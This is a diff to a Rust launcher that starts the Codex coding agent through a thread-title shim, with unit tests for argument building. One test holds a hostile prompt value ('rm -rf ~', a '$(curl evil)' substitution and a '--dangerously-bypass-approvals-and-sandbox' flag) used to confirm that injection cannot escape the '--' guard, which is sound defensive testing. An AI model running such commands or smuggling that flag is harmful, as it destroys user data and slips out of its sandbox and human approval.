@@ -1,10 +1,15 @@
-//! Codex harness: runs `codex -- <prompt>` in the tab. Codex has no thread-title
-//! flag, so the prompt rides as a single `--`-guarded positional with no `--name`.
+//! Codex harness: runs Codex through pwf's hidden title shim, then `codex -- <prompt>`.
+//! Codex has no `--name` flag, so the shim renames the Codex thread via Codex's
+//! app-server API while keeping the prompt as a single `--`-guarded positional.
 
-use super::{AgentLauncher, argv::LaunchArgv};
-use crate::engines::pending_work::{
-    launch::{Worktree, new_launch_prompt},
-    model::Item,
+use super::AgentLauncher;
+use crate::{
+    codex_thread_title,
+    engines::pending_work::{
+        agent::query::get_thread_title,
+        launch::{LaunchPolicy, new_launch_prompt},
+        model::Item,
+    },
 };
 
 const BINARY: &str = "codex";
@@ -17,8 +22,12 @@ impl AgentLauncher for CodexLauncher {
         BINARY
     }
 
-    fn argv(&self, item: &Item, worktree: Worktree) -> Vec<String> {
-        LaunchArgv::new(BINARY).into_guarded(new_launch_prompt(item, worktree))
+    fn argv(&self, item: &Item, policy: LaunchPolicy) -> Vec<String> {
+        codex_thread_title::launch_argv(
+            get_thread_title::handle(item.into()),
+            item.repo.clone().unwrap_or_default(),
+            new_launch_prompt(item, policy),
+        )
     }
 }
 
@@ -32,17 +41,19 @@ mod tests {
     }
 
     #[test]
-    fn builds_guarded_argv_no_name() {
+    fn builds_title_shim_argv_with_guarded_codex_prompt() {
         let item = Item {
             prompt: "do the thing".to_string(),
+            repo: Some("/repo".to_string()),
             ..Item::default_for_test("PWF-0068", "codex dispatch")
         };
-        let argv = CodexLauncher.argv(&item, Worktree::from(false));
-        assert_eq!(argv[0], "codex");
-        // No `--name`: codex has no thread-title flag. The `--` guard precedes the prompt.
-        assert_eq!(argv[1], "--");
-        assert!(argv[2].contains("do the thing"));
-        assert_eq!(argv.len(), 3);
+        let argv = CodexLauncher.argv(&item, LaunchPolicy::default());
+        assert_eq!(argv[1], codex_thread_title::LAUNCH_COMMAND);
+        assert!(argv.contains(&"PWF-0068 - codex dispatch".to_string()));
+        assert!(argv.contains(&"/repo".to_string()));
+        let codex_pos = argv.iter().position(|arg| arg == "codex").unwrap();
+        assert_eq!(argv[codex_pos + 1], "--");
+        assert!(argv[codex_pos + 2].contains("do the thing"));
     }
 
     #[test]
@@ -52,13 +63,15 @@ mod tests {
         let item = Item {
             prompt: "; rm -rf ~ $(curl evil)\n--dangerously-bypass-approvals-and-sandbox"
                 .to_string(),
+            repo: Some("/repo".to_string()),
             ..Item::default_for_test("PWF-0068", "hostile")
         };
-        let argv = CodexLauncher.argv(&item, Worktree::from(false));
-        assert_eq!(argv[0], "codex"); // store can't change WHAT runs
-        assert_eq!(argv[1], "--"); // guard present
-        assert_eq!(argv.len(), 3); // prompt is exactly one trailing element
-        assert!(argv[2].contains("rm -rf"));
-        assert!(argv[2].contains("--dangerously-bypass-approvals-and-sandbox"));
+        let argv = CodexLauncher.argv(&item, LaunchPolicy::default());
+        assert_eq!(argv[1], codex_thread_title::LAUNCH_COMMAND);
+        let codex_pos = argv.iter().position(|arg| arg == "codex").unwrap();
+        assert_eq!(argv[codex_pos + 1], "--"); // guard present
+        assert_eq!(argv.last().unwrap(), &argv[codex_pos + 2]); // prompt is exactly one trailing element
+        assert!(argv[codex_pos + 2].contains("rm -rf"));
+        assert!(argv[codex_pos + 2].contains("--dangerously-bypass-approvals-and-sandbox"));
     }
 }
